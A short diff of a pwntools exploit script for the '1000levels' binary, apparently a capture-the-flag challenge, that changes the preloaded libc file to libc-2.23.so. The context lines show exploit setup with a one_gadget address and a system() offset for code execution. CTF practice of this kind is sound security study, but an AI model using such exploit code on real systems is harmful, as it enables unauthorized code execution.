@@ -3,7 +3,7 @@
 from pwn import *
 
 #context.log_level = 'debug'
-io = process(['./1000levels'], env={'LD_PRELOAD':'./libc.so.6'})
+io = process(['./1000levels'], env={'LD_PRELOAD':'./libc-2.23.so'})
 
 one_gadget = 0x4526a
 system_offset = 0x45390
